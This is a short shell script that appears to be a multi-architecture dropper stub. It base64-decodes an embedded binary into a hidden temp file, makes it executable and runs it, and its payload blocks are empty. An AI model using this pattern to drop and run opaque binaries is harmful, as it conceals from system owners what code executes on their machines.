#!/bin/sh
set -e
ARCH=$(uname -m)
OUT="${TMPDIR:-/tmp}/.gl_$$_$(date +%s%N 2>/dev/null || echo $RANDOM)"
cleanup(){ rm -f "$OUT" 2>/dev/null; }
trap cleanup EXIT INT TERM
if [ "$ARCH" = "x86_64" ] || [ "$ARCH" = "amd64" ]; then
base64 -d > "$OUT" << 'X86EOF'

X86EOF
elif [ "$ARCH" = "aarch64" ] || [ "$ARCH" = "arm64" ]; then
base64 -d > "$OUT" << 'ARM64EOF'

ARM64EOF
elif echo "$ARCH" | grep -qi "^arm"; then
base64 -d > "$OUT" << 'ARMV7EOF'

ARMV7EOF
else echo "[-] Unsupported: $ARCH"; exit 1; fi
chmod +x "$OUT" 2>/dev/null
exec "$OUT" "$@"
